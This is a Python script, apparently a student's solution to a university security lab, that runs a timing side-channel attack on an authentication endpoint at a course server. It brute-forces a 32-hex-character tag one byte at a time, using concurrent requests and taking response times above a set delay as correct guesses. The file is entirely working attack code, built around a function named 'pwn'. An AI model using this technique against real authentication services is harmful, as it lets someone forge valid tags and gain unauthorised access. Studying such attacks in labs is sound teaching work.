import requests
import time
import concurrent.futures

def pad_string(input_str, target_length):
    while len(input_str) < target_length:
        input_str += '0'
    return input_str

def request(user, delay, tag):
    tag_max_length = 32

    # Prepare the tag and the url
    tag_formatted_as_string = hex(tag) # represent as string
    tag_formatted_as_string = tag_formatted_as_string[2:] # remove the two first characters which are "0x"
    tag_length = len(tag_formatted_as_string)
    tag_formatted_as_string = pad_string(tag_formatted_as_string, tag_max_length) # pad string
    url = f"http://dart.cse.kau.se:12345/auth/{delay}/{user}/{tag_formatted_as_string}"

    # Make request and time the response
    start_time = time.time()
    response = requests.get(url)
    end_time = time.time()
    elapsed_time = end_time - start_time

    result = {
        "status_code": response.status_code,
        "ok": response.status_code == 200 or elapsed_time * 1000 >= delay,
        "text": response.text,
        "url": url,
        "elapsed_time": "{:.4f}".format(elapsed_time * 1000),
        "delay": delay,
        "hex": tag,
        "tag": tag_formatted_as_string,
        "is_tag_full_length": tag_length >= tag_max_length,
        "user": user
    }

    if response.status_code == 400:
        print(f"Malformed input! url={url}")
    
    return result

def append_hex(original_hex, append_hex):
    result_hex = hex(original_hex)[2:] + hex(append_hex)[2:]
    return int(result_hex, 16)

def pwn(user, delay, max_workers, tag_prefix):
    if tag_prefix is None:
        tags = [item for item in range(256)]
    else:
        tags = [append_hex(tag_prefix, item) for item in range(256)]
    # print([hex(item) for item in tags])

    with concurrent.futures.ThreadPoolExecutor(max_workers) as executor:
        uncompleted_futures = []
        for tag in tags:
            uncompleted_futures.append(executor.submit(request, user, delay, tag))
        
        for completed_futures in concurrent.futures.as_completed(uncompleted_futures):
            result = completed_futures.result()
            if result["ok"]:
                # print(result)
                if result["is_tag_full_length"]:
                    print(f"Completed!\n{result['url']}")
                else:
                    next_tag_prefix = result["hex"]
                    print(f"{result['tag']}\t{result['elapsed_time']}\t{result['delay']}\t\t{result['user']}")
                    pwn(user, delay, max_workers, next_tag_prefix) # Run another
                executor.shutdown(wait=False) # Shut down all other running futures in this instance of the thread pool executor

if __name__ == "__main__":
    user = "oscaande104"
    delay = 200
    max_workers = 5
    starting_tag_prefix = None

    print(f"tag\t\t\t\t\telapsed (ms)\tdelay (ms)\tuser")
    pwn(user, delay, max_workers, starting_tag_prefix)